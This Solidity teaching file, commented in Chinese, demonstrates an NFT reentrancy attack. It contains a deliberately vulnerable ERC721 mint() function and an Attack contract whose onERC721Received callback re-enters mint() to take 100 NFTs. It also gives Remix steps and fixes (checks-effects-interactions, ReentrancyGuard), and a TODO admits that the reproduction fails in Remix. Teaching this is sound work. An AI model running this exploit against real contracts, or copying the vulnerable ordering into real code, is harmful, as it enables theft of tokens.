// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
	NFT重入攻击
	NFT标准(ERC721/ERC1155)为了防止用户误把资产转入黑洞而加入了安全转账:
	如果转入地址为合约, 则会调用该地址相应的检查函数, 确保它已准备好接收
	NFT资产; 例如 ERC721 的 safeTransferFrom() 函数会调用目标地址的 
	onERC721Received() 函数, 而黑客可以把恶意代码嵌入其中进行攻击

	Remix 复现:
	1. 部署NFTReentrancy合约
	2. 部署Attack合约, 参数填NFTReentrancy合约地址
	3. 调用Attack合约的attack()函数发起攻击
	4. 调用NFTReentrancy合约的balanceOf()函数查询Attack合约的持仓, 可以看到
		持有100个NFT, 攻击成功
	TODO: 实际复现中第3步remix报错 "ERC721: transfer to non ERC721Receiver
		implementer"


	预防:
	1. 检查-影响-交互模式:
		编写函数时, 要先检查状态变量是否符合要求, 接着更新状态变量(例如余额), 
		最后再和别的合约交互; 可以用这个模式修复有漏洞的mint()函数:
		function mint() payable external {
			// 检查是否mint过
			require(mintedAddress[msg.sender] == false);
			// 增加total supply
			totalSupply++;
			// 记录mint过的地址
			mintedAddress[msg.sender] = true;
			// mint
			_safeMint(msg.sender, totalSupply);
		}

	2. 重入锁: 是一种防止重入函数的修饰器(modifier)
		建议直接使用OpenZeppelin提供的ReentrancyGuard(TODO: 熟练使用)
		https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol

*/

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

// NFT contract with Reentrancy Vulnerability
contract NFTReentrancy is ERC721 {
    uint256 public totalSupply;
    mapping(address => bool) public mintedAddress;
    // 构造函数, 初始化NFT合集的名称、代号
    constructor() ERC721("Reentry NFT", "ReNFT"){}

    // 铸造函数, 每个用户只能铸造1个NFT
    // 有重入漏洞
    function mint() payable external {
        // 检查是否mint过
        require(mintedAddress[msg.sender] == false);
        // 增加total supply
        totalSupply++;
        // mint
        _safeMint(msg.sender, totalSupply); // 先交互再更新状态变量, 有重入风险
        // 记录mint过的地址
        mintedAddress[msg.sender] = true;
    }
}

contract Attack is IERC721Receiver{
    NFTReentrancy public nft; // Bank合约地址

    // 初始化NFT合约地址
    constructor(NFTReentrancy _nftAddr) {
        nft = _nftAddr;
    }

    // 攻击函数，发起攻击
    function attack() external {
        nft.mint();
    }

    // ERC721的回调函数, 会重复调用mint函数, 铸造100个
    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        if(nft.balanceOf(address(this)) < 100){
            nft.mint();
        }
        return this.onERC721Received.selector;
    }
}
